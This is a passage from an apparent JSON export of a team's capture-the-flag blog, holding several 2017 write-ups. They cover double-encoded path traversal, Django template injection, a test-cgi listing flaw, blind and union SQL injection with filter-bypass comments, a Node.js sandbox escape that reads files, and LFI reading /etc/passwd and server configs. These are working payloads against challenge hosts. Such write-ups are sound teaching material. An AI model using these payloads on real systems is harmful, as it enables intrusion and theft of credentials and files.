flag!","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"lfi","slug":"lfi","permalink":"https://teamrocketist.github.io/tags/lfi/"},{"name":"blackbox","slug":"blackbox","permalink":"https://teamrocketist.github.io/tags/blackbox/"}]},{"title":"[Web] CSAW - orange v1","slug":"Web-CSAW-orange-v1","date":"2017-09-17T23:13:50.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/09/18/Web-CSAW-orange-v1/","link":"","permalink":"https://teamrocketist.github.io/2017/09/18/Web-CSAW-orange-v1/","excerpt":"","text":"orange v1I wrote a little proxy program in NodeJS for my poems folder.Everyone wants to read flag.txt but I like it too much to share.http://web.chal.csaw.io:7311/?path=orange.txt We don’t have much here, its just a GET parameter, after a bunch of tries we realized that “..” characters are banned, so lets try with double encoding: 1234567891011121314151617$ curl 'http://web.chal.csaw.io:7311/?path=%252e%252e/'&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"&gt;&lt;html&gt;&lt;title&gt;Directory listing for /poems/../&lt;/title&gt;&lt;body&gt;&lt;h2&gt;Directory listing for /poems/../&lt;/h2&gt;&lt;hr&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=\".dockerignore\"&gt;.dockerignore&lt;/a&gt;&lt;li&gt;&lt;a href=\"back.py\"&gt;back.py&lt;/a&gt;&lt;li&gt;&lt;a href=\"flag.txt\"&gt;flag.txt&lt;/a&gt;&lt;li&gt;&lt;a href=\"poems/\"&gt;poems/&lt;/a&gt;&lt;li&gt;&lt;a href=\"serve.sh\"&gt;serve.sh&lt;/a&gt;&lt;li&gt;&lt;a href=\"server.js\"&gt;server.js&lt;/a&gt;&lt;/ul&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt; And there it is the flag! 12$ curl 'http://web.chal.csaw.io:7311/?path=%252e%252e/flag.txt'flag&#123;thank_you_based_orange_for_this_ctf_challenge&#125; Since we could leak the source code here ill post it:123456789101112131415161718192021222324252627282930var http = require('http');var fs = require('fs');var url = require('url');var server = http.createServer(function(req, res) &#123; try &#123; var path = url.parse(req.url, true).query; path = path['path']; if (path.indexOf(\"..\") == -1 &amp;&amp; path.indexOf(\"ＮＮ\") == -1) &#123; var base = \"http://localhost:8080/poems/\"; var callback = function(response)&#123; var str = ''; response.on('data', function (chunk) &#123; str += chunk; &#125;); response.on('end', function () &#123; res.end(str); &#125;); &#125; http.get(base + path, callback).end(); &#125; else &#123; res.writeHead(403); res.end(\"WHOA THATS BANNED!!!!\"); &#125; &#125; catch (e) &#123; res.writeHead(404); res.end('Oops'); &#125;&#125;);","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"lfi","slug":"lfi","permalink":"https://teamrocketist.github.io/tags/lfi/"}]},{"title":"[Web] CSAW - Shia Labeouf-off","slug":"Web-CSAW-Shia-Labeouf-off","date":"2017-09-17T21:27:02.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/09/17/Web-CSAW-Shia-Labeouf-off/","link":"","permalink":"https://teamrocketist.github.io/2017/09/17/Web-CSAW-Shia-Labeouf-off/","excerpt":"","text":"WebShia Labeouf-off!Do itJust do itDon’t let your dreams be dreamsYesterday you said tomorrowSo just do itMake your dreams come trueJust do itPick 1: http://web.chal.csaw.io:5487 http://web.chal.csaw.io:5488 http://web.chal.csaw.io:5489 http://web.chal.csaw.io:5490 First of all great shout outs to CSAW for publishing a django challenge, even if it wasn’t a very hard one it was fun to do it.Now going to the challenge, we know we have django debug mode enabled so lets try to generate some errors in the available webpages to see if we can leak some source code for example if we give an id in polls url we generate an exception: If we scroll down a little bit and check those hidden tabs, we can find some leaked source code! We have some nice custom made template filter tags! in django you can create custom tags and use it on templates, we have a function that lists the attributes(listme) of a python object one that gets attributes(getme): 1234567891011121314@register.filter(name='getme')def getme(value, arg): return getattr(value, arg)@register.filter(name='checknum')def checknum(value): check(value)@register.filter(name='listme')def listme(value): return dir(value)def check(value): if value &gt; 2: raise Exception(\"Our infrastructure can't support that many Shias!\") Now we need to find a Server-Side Template Injection (SSTI) so we can use this useful filters we can inject code with: 12&#123;% expressions %&#125;&#123;&#123; arg1|filter:arg2 &#125;&#125; we can find one at http://web.chal.csaw.io:5490/ad-lib/ lets try to see the contents of debug variable: Query Results Yap it works! the global debug leak alot of variables, mrpoopy object is interesting! lets check its attributes with the filter listme Query Response The flag must be in flag!! we need now to get this attribute with getme filter! Query Response","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"python","slug":"python","permalink":"https://teamrocketist.github.io/tags/python/"},{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"pythonserver","slug":"pythonserver","permalink":"https://teamrocketist.github.io/tags/pythonserver/"},{"name":"ssti","slug":"ssti","permalink":"https://teamrocketist.github.io/tags/ssti/"},{"name":"django","slug":"django","permalink":"https://teamrocketist.github.io/tags/django/"}]},{"title":"[Web] SECTF - Sprinkler system","slug":"Web-SECTF-Sprinkler-system","date":"2017-09-15T19:36:03.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/09/15/Web-SECTF-Sprinkler-system/","link":"","permalink":"https://teamrocketist.github.io/2017/09/15/Web-SECTF-Sprinkler-system/","excerpt":"","text":"Sprinkler system - Web (100 + 0)Damn new york… some chick tricked you into standing in the rain on the very first day… it’s payback time!Solves: 238Service: http://sprinklers.alieni.se/Author: avlidienbrunn Starting by looking into robots.txt 123curl 'http://sprinklers.alieni.se/robots.txt'User-agent: *Disallow: /cgi-bin/test-cgi We have a hidden directory /cgi-bin/test-cgi, my first instinct was to try shellshock but ofcourse it didn’t work so after a while searching in google I found this http://insecure.org/sploits/test-cgi.server_protocol.html. To list the root directory we can do this:12345678910111213141516171819202122curl 'http://sprinklers.alieni.se/cgi-bin/test-cgi?/*'CGI/1.0 test script report:argc is 1. argv is /\\*.SERVER_SOFTWARE = Apache/2.4.18 (Ubuntu)SERVER_NAME = sprinklers.alieni.seGATEWAY_INTERFACE = CGI/1.1SERVER_PROTOCOL = HTTP/1.1SERVER_PORT = 80REQUEST_METHOD = GETHTTP_ACCEPT = */*PATH_INFO = PATH_TRANSLATED = SCRIPT_NAME = /cgi-bin/test-cgiQUERY_STRING = /app /bin /boot /dev /etc /git /home /lib /lib64 /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /varREMOTE_HOST =REMOTE_ADDR = 172.68.102.79REMOTE_USER =AUTH_TYPE =CONTENT_TYPE =CONTENT_LENGTH = Nothing special on the root directory lets try to list the current directory to instead of doing ?/ lets try ? at the end of the url: 12345678910111213141516171819202122$ curl 'http://sprinklers.alieni.se/cgi-bin/test-cgi?*'CGI/1.0 test script report:argc is 1. argv is \\*.SERVER_SOFTWARE = Apache/2.4.18 (Ubuntu)SERVER_NAME = sprinklers.alieni.seGATEWAY_INTERFACE = CGI/1.1SERVER_PROTOCOL = HTTP/1.1SERVER_PORT = 80REQUEST_METHOD = GETHTTP_ACCEPT = */*PATH_INFO = PATH_TRANSLATED = SCRIPT_NAME = /cgi-bin/test-cgiQUERY_STRING = enable_sprinkler_system test-cgiREMOTE_HOST =REMOTE_ADDR = 172.68.102.79REMOTE_USER =AUTH_TYPE =CONTENT_TYPE =CONTENT_LENGTH It works! there is a file named enable_sprinkler_system! lets see what is its content:","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"cgi","slug":"cgi","permalink":"https://teamrocketist.github.io/tags/cgi/"},{"name":"directorylisting","slug":"directorylisting","permalink":"https://teamrocketist.github.io/tags/directorylisting/"}]},{"title":"[Misc] SECTF - Joeys screenshot","slug":"Misc-SECTF-Joeys-screenshot","date":"2017-09-15T19:17:28.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/09/15/Misc-SECTF-Joeys-screenshot/","link":"","permalink":"https://teamrocketist.github.io/2017/09/15/Misc-SECTF-Joeys-screenshot/","excerpt":"","text":"Joeys screenshot - Misc (50 + 0)Joey gave me this screenshot to prove he got into The Gibson. Can you help us hack The Gibson too?Solves: 69Download: http://dl.ctf.rocks/joey.tar.gzAuthor: SecureLink / klondike Pretty simple one, this image had some strange hidden comments, I extracted them using https://github.com/zed-0xff/zsteg: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142$ zsteg chall.pngmeta Comment .. 00000000: 5f 33 36 |_36 |meta Comment .. 00000000: 33 32 37 |327 |meta Comment .. 00000000: 43 32 |C2 |meta Comment .. 00000000: 31 33 34 |134 |meta Comment .. 00000000: 35 32 34 |524 |meta Comment .. 00000000: 4e 32 32 |N22 |meta Comment .. 00000000: 48 34 31 |H41 |meta Comment .. 00000000: 7b 34 |&#123;4 |meta Comment .. 00000000: 5f 31 31 |_11 |meta Comment .. 00000000: 5f 33 33 |_33 |meta Comment .. 00000000: 5f 31 33 |_13 |meta Comment .. 00000000: 30 32 31 |021 |meta Comment .. 00000000: 45 31 |E1 |meta Comment .. 00000000: 35 33 30 |530 |meta Comment .. 00000000: 33 34 32 |342 |meta Comment .. 00000000: 48 34 33 |H43 |meta Comment .. 00000000: 30 33 38 |038 |meta Comment .. 00000000: 35 33 35 |535 |meta Comment .. 00000000: 50 32 36 |P26 |meta Comment .. 00000000: 55 32 35 |U25 |meta Comment .. 00000000: 47 33 37 |G37 |meta Comment .. 00000000: 34 31 35 |415 |meta Comment .. 00000000: 33 39 |39 |meta Comment .. 00000000: 42 31 39 |B19 |meta Comment .. 00000000: 53 30 |S0 |meta Comment .. 00000000: 55 32 39 |U29 |meta Comment .. 00000000: 52 32 38 |R28 |meta Comment .. 00000000: 52 33 32 |R32 |meta Comment .. 00000000: 44 31 34 |D14 |meta Comment .. 00000000: 32 31 32 |212 |meta Comment .. 00000000: 5f 32 33 |_23 |meta Comment .. 00000000: 44 35 |D5 |meta Comment .. 00000000: 44 33 39 |D39 |meta Comment .. 00000000: 5f 34 30 |_40 |meta Comment .. 00000000: 47 31 37 |G17 |meta Comment .. 00000000: 4b 38 |K8 |meta Comment .. 00000000: 59 31 30 |Y10 |meta Comment .. 00000000: 33 34 34 |344 |meta Comment .. 00000000: 21 34 35 |!45 |meta Comment .. 00000000: 35 32 30 |520 |meta Comment .. 00000000: 54 33 |T3 |meta Comment .. 00000000: 33 33 31 |331 |meta Comment .. 00000000: 31 31 38 |118 |meta Comment .. 00000000: 34 36 |46 |meta Comment .. 00000000: 7d 34 36 |&#125;46 |meta Comment .. 00000000: 5f 31 36 |_16 |meta Comment .. 00000000: 5f 37 |_7 | After extracting them into a file I noticed the pattern behind it! if we get some comments we can see something familiar! 12345S0E1C2T3&#123;4 Yes! the first letter is a character from the flag and the order is the number after it! so lets write a python script to parse this and construct the flag! 123456789d = &#123;&#125;flag = ''with open('notes.txt', 'r') as f: l = f.read().split() for s in l: d[s[1:]] = s[0]for x in xrange(47): flag += d[str(x)]print flag A now running it 12$ python misc50.py SECT&#123;D4_K3Y_2_D4_G1B50N_5UP3RU53R_15_G0D_H3H3!&#125;","categories":[{"name":"Misc","slug":"Misc","permalink":"https://teamrocketist.github.io/categories/Misc/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://teamrocketist.github.io/tags/misc/"},{"name":"stego","slug":"stego","permalink":"https://teamrocketist.github.io/tags/stego/"},{"name":"zsteg","slug":"zsteg","permalink":"https://teamrocketist.github.io/tags/zsteg/"},{"name":"comments","slug":"comments","permalink":"https://teamrocketist.github.io/tags/comments/"},{"name":"puzzle","slug":"puzzle","permalink":"https://teamrocketist.github.io/tags/puzzle/"}]},{"title":"[Web] SECTF - naughtyads","slug":"Web-SECTF-naughtyads","date":"2017-09-15T16:10:27.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/09/15/Web-SECTF-naughtyads/","link":"","permalink":"https://teamrocketist.github.io/2017/09/15/Web-SECTF-naughtyads/","excerpt":"","text":"Naughty ads - Web (200 + 0)Can you put agent Gill in the naughty ad section? His phone number is “555-31338”Solves: 122Service: http://naughtyads.alieni.se/Author: avlidienbrunn Checking in robots.txt we have a hidden directory called admin, but there is a http authentication and we don’t know the user and the password, we need to find a vulnerability to get the credentials. Finding the vulnerabilityAnother Sql injection after some searching I found a GET param vulnerable to blind SQLi Successful query that returns content : 1http://naughtyads.alieni.se?id=3ad3-46c3-b975' AND 1 AND 'A'='A Unsuccessful query that returns nothing : 1http://naughtyads.alieni.se?id=3ad3-46c3-b975' AND 1 AND 'A'='B Bypassing filtersNow there is some kind of protection, there is a filter blacklisting alot of SQL words, one way of bypassing it is by doing this: 12// bypasses or filterhttp://naughtyads.alieni.se?id=3ad3-46c3-b975' /*!50000or*/ 1 AND 'A'='A Performing Union InjectionsGetting Table names: 1http://naughtyads.alieni.se/?id=3ad3-46c3-b97' /*!50000union*/ /*!50000all*/ /*!50000select*/ group_concat(table_name) /*!50000from*/ information_schema.tables /*!50000where*/ table_schema=database() AND '1'='1 Getting Columns names: 1http://naughtyads.alieni.se/?id=3ad3-46c3-b97' /*!50000union*/ /*!50000all*/ /*!50000select*/ group_concat(column_name) /*!50000from*/ information_schema.columns /*!50000where*/ table_schema=database() AND '1'='1 Getting the Username and password 1http://naughtyads.alieni.se/?id=3ad3-46c3-b97' /*!50000union*/ /*!50000all*/ /*!50000select*/ group_concat(name, \" \", password) /*!50000from*/ login /*!50000where*/ '1'='1 After searching in google the hash 5ebe2294ecd0e0f08eab7690d2a6ee69 is secret Admin LoginWe have a simple form with a image upload well if we remember the challenge description: 1Can you put agent Gill in the naughty ad section? His phone number is &quot;555-31338&quot; So lets put the number and submit the form: 12$ curl 'http://naughtyads.alieni.se/admin/' --user webmasterofdoom3755:secret --data 'phone=555-31338'SECT&#123;~tr4nsv3stiT3s_w3lc0me_t00~&#125; And we got the flag!!!","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"filterbypass","slug":"filterbypass","permalink":"https://teamrocketist.github.io/tags/filterbypass/"},{"name":"blindsqli","slug":"blindsqli","permalink":"https://teamrocketist.github.io/tags/blindsqli/"},{"name":"sqlinjection","slug":"sqlinjection","permalink":"https://teamrocketist.github.io/tags/sqlinjection/"},{"name":"httpauth","slug":"httpauth","permalink":"https://teamrocketist.github.io/tags/httpauth/"}]},{"title":"[Pwn] SECTF - Jail 1","slug":"Pwn-SECTF-Jail-1","date":"2017-09-15T15:08:51.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/09/15/Pwn-SECTF-Jail-1/","link":"","permalink":"https://teamrocketist.github.io/2017/09/15/Pwn-SECTF-Jail-1/","excerpt":"","text":"Jail - Pwn (200 + 0)Joey gave you the disk with the file on it and now you’re in jail. They’re charging you with some serious shit, man! Better figure out a way to escape.Solves: 43Service: jail.alieni.se:55542Author: avlidienbrunn A jail escape challenge this time with javascript we need, we can start by sending this so we can view the source code of the current function running: 1234567891011121314151617_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _'_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"|| \"You get one call, UNO.\" | \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" Phone #&gt; this And we get this source code: 1234567891011121314151617181920212223function call(number) &#123; var hangup = process.exit; var line = \"\"; if(number == 911)&#123; console.log(\"Invalid number\"); ask(); return; &#125; var flag,Array,Boolean,Date,global,Error,EvalError,Function,Number,Object,RangeError,ReferenceError,String,SyntaxError,TypeError,URIError,decodeURI,decodeURIComponent,encodeURI,encodeURIComponent,isFinite,isNaN,parseFloat,parseInt,ArrayBuffer,Buffer,DTRACE_HTTP_CLIENT_REQUEST,DTRACE_HTTP_CLIENT_RESPONSE,DTRACE_HTTP_SERVER_REQUEST,DTRACE_HTTP_SERVER_RESPONSE,DTRACE_NET_SERVER_CONNECTION,DTRACE_NET_STREAM_END,DataView,Float32Array,Float64Array,Int16Array,Int32Array,Int8Array,Map,Promise,Proxy,Set,Symbol,Uint16Array,Uint32Array,Uint8Array,Uint8ClampedArray,WeakMap,WeakSet,assert,clearImmediate,clearInterval,clearTimeout,escape,events,require,setImmediate,setInterval,setTimeout,stream,unescape,__defineGetter__,__defineSetter__,__lookupGetter__,__lookupSetter__,constructor,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf; if(new RegExp(/[\\[\\]\\.\\\\]/).test(number))&#123; console.log(\"Dangerous characters detected\"); hangup(); return; &#125; arguments = undefined; console.log(\"Calling \"+eval(number)+\"... Nobody picks up!\"); hangup(); &#125; We can see after we send our number the program will end, at the begin of the function we can see the hangup function is being set into process.exit. We have an interesting feature too if we try to call 911 we will jump into ask function: 1234567891011121314151617_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _'_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"|| \"You get one call, UNO.\" | \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" Phone #&gt; ask 12345function ask()&#123; rl.question(template,function(answer)&#123; Jail.call(answer); &#125;);&#125; As we can see the function ask is restarting the program this will come handy later, we have some restriction too RegexExp class is blocking ‘.’, ‘[‘, ‘]’ and ‘\\‘ characters: 12345if(new RegExp(/[\\[\\]\\.\\\\]/).test(number))&#123; console.log(\"Dangerous characters detected\"); hangup(); return;&#125; So how do can we bypass this? my plan was: 12341 - Override RegexExp class to always return true.2 - Recall function call but this time with 911 number(this will restart the program and a this point RegexExp returns always false so we can inject any character we want).3 - Get the current filename.4 - Use process.mainModule.require(&apos;fs&apos;).readFileSync(filename) to read the file and get the flag! Override RegexExpTo override the RegexExp class we can just do this: 1hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125; 123456789101112131415161718192021222324252627282930313233343536_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _'_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"|| \"You get one call, UNO.\" | \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" Phone #&gt; hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;Calling function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;... Nobody picks up!Invalid number_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _'_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"|| \"You get one call, UNO.\" | \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" Phone #&gt; Getting the filenameAt this point we can inject any characters we want because the test function will always return false! so lets get the filename: 12345678910111213141516171819202122232425262728293031323334353637_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _&apos;_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;|| &quot;You get one call, UNO.&quot; | &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; Phone #&gt; hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;Calling function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;... Nobody picks up!Invalid number_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _&apos;_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;|| &quot;You get one call, UNO.&quot; | &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; Phone #&gt; __filenameCalling /app/jail.js... Nobody picks up! We have the full path! the javascript file is located in /app/jail.js Read the javascript fileFinally by injecting this after the override process.mainModule.require(‘fs’).readFileSync(‘/app/jail.js’).toString() 123456789101112131415161718192021222324252627282930313233343536373839_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _'_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"|| \"You get one call, UNO.\" | \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" Phone #&gt; hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;Calling function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;... Nobody picks up!Invalid number_____________________________ || || || || || ||, , ,|| || || (||/|/(/||/ || || ||| _'_´||| || || || o o || || || (|| - ´||) || || || = || || || ||\\___/|| || ||___||) , (||___|| /||---||-\\_/-||---||\\ / ||--_||_____||_--|| \\ (_(||)-|S555-4202|-(||)_)|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"|| \"You get one call, UNO.\" | \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" Phone #&gt; process.mainModule.require('fs').readFileSync('/app/jail.js').toString()Calling var flag = \"SECT&#123;1ts_1n_th4T_pl4Ce_Wh3re_1_Pu7_tH4t_Th1ng_th4T_t1m3,&#125;\"var readline = require('readline');var rl = readline.createInterface(process.stdin, process.stdout); Finally our flag is SECT{1ts_1n_th4T_pl4Ce_Wh3re_1_Pu7_tH4t_Th1ng_th4T_t1m3,}","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"Sandbox","slug":"Pwn/Sandbox","permalink":"https://teamrocketist.github.io/categories/Pwn/Sandbox/"},{"name":"Javascript","slug":"Pwn/Sandbox/Javascript","permalink":"https://teamrocketist.github.io/categories/Pwn/Sandbox/Javascript/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"sandbox","slug":"sandbox","permalink":"https://teamrocketist.github.io/tags/sandbox/"},{"name":"jailescape","slug":"jailescape","permalink":"https://teamrocketist.github.io/tags/jailescape/"},{"name":"javascript","slug":"javascript","permalink":"https://teamrocketist.github.io/tags/javascript/"},{"name":"nodejs","slug":"nodejs","permalink":"https://teamrocketist.github.io/tags/nodejs/"}]},{"title":"[Pwn] ASIS - Mary Morton","slug":"Pwn-ASIS-Mary-Morton","date":"2017-09-13T11:25:06.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/09/13/Pwn-ASIS-Mary-Morton/","link":"","permalink":"https://teamrocketist.github.io/2017/09/13/Pwn-ASIS-Mary-Morton/","excerpt":"","text":"Mary MortonAverage: 4Rating Count: 20Top 3 Solver 217 DangRanKeYi AlonePoints43Solves142CategoryPwnableDescription: Mary surprises Sherlock with her knowledge and insight into his character, but she had a very obvious vulnerability which Sherlock exploited it, although it was very painful for him! Starting by checking the binary security with checksec: 123$ checksec -f ./mary_mortonRELRO STACK CANARY NX PIE RPATH RUNPATH FORTIFY Fortified Fortifiable FILEPartial RELRO Canary found NX enabled No PIE No RPATH No RUNPATH Yes 0 2 ./mary_morton We have stack canary protection and non executable stack, if we analyse the binary with radare2 we can see it’s protected with a password, we can obtain this using radare2: The password","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"}],"tags":[{"name":"rop","slug":"rop","permalink":"https://teamrocketist.github.io/tags/rop/"},{"name":"stackcanary","slug":"stackcanary","permalink":"https://teamrocketist.github.io/tags/stackcanary/"},{"name":"stackoverflow","slug":"stackoverflow","permalink":"https://teamrocketist.github.io/tags/stackoverflow/"},{"name":"formatstring","slug":"formatstring","permalink":"https://teamrocketist.github.io/tags/formatstring/"}]},{"title":"[Web] ASIS - Golem is stupid!","slug":"Web-ASIS-Golem-is-stupid","date":"2017-09-11T04:08:19.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/09/11/Web-ASIS-Golem-is-stupid/","link":"","permalink":"https://teamrocketist.github.io/2017/09/11/Web-ASIS-Golem-is-stupid/","excerpt":"","text":"Average: 4.57Rating Count: 28You Rated: Not ratedTop 3 Solver NYUSEC 0daysober TokyoWesternsPoints41Solves151CategoryWebDescription: Golem is an animated anthropomorphic being that is magically created entirely from inanimate matter, but Golem is stupid! Note that the server was down after the CTF ended I can’t show some pictures of the CTF as I would like.We could easily find a LFI on https://golem.asisctf.com/article?name= : 1curl 'https://golem.asisctf.com/article?name=../../../etc/passwd' We could include the /etc/passwd file, we noticed the website was running on Ngnix so we tried some valid paths paths for the configuration files like this: 1curl 'https://golem.asisctf.com/article?name=../../../etc/nginx/sites-available/golem' And we got this The important part of this config file is here! the path to the python configuration server files: After some trial and error we included the server.py with: 1curl 'https://golem.asisctf.com/article?name=../../../opt/serverPython/golem/server.py' The file is: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#!/usr/bin/pythonimport os from flask import ( Flask, render_template, request, url_for, redirect, session, render_template_string)from flask.ext.session import Session app = Flask(__name__) execfile('flag.py')execfile('key.py') FLAG = flagapp.secret_key = key @app.route(\"/golem\", methods=[\"GET\", \"POST\"])def golem(): if request.method != \"POST\": return redirect(url_for(\"index\")) golem = request.form.get(\"golem\") or None if golem is not None: golem = golem.replace(\".\", \"\").replace(\"_\", \"\").replace(\"&#123;\",\"\").replace(\"&#125;\",\"\") if \"golem\" not in session or session['golem'] is None: session['golem'] = golem template = None if session['golem'] is not None: template = '''&#123;%% extends \"layout.html\" %%&#125; &#123;%% block body %%&#125; &lt;h1&gt;Golem Name&lt;/h1&gt; &lt;div class=\"row&gt; &lt;div class=\"col-md-6 col-md-offset-3 center\"&gt; Hello : %s, why you don't look at our &lt;a href='/article?name=article'&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#123;%% endblock %%&#125; ''' % session['golem'] print session['golem'] = None return render_template_string(template) @app.route(\"/\", methods=[\"GET\"])def index(): return render_template(\"main.html\") @app.route('/article', methods=['GET'])def article(): error = 0 if 'name' in request.args: page = request.args.get('name') else: page = 'article' if page.find('flag')&gt;=0: page = 'notallowed.txt' try: template = open('/home/golem/articles/&#123;&#125;'.format(page)).read() except Exception as e: template = e return render_template('article.html', template=template) if __name__ == \"__main__\": app.run(host='0.0.0.0', debug=False) Now the real problem is the flag is in flag.py file but the word flag is filtered: 12if page.find('flag')&gt;=0: page = 'notallowed.txt' We can include the key.py which contains a key, this key according to flask documentation is used to generate session cookies, the included key was 7h15_5h0uld_b3_r34lly_53cur3d.If we analyse the golem function we can see its filtering the {, }, . and _ characters so we can’t template inject code here, well actually if we look closely, if we provide a session cookie “golem” it doesn’t apply this filter but first we need to encrypt the cookie,this is easy because we have the key!We found a python code online that does this after some small modifications we ended up with this: 12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env pythonfrom flask.sessions import SecureCookieSessionInterfacefrom itsdangerous import URLSafeTimedSerializerimport 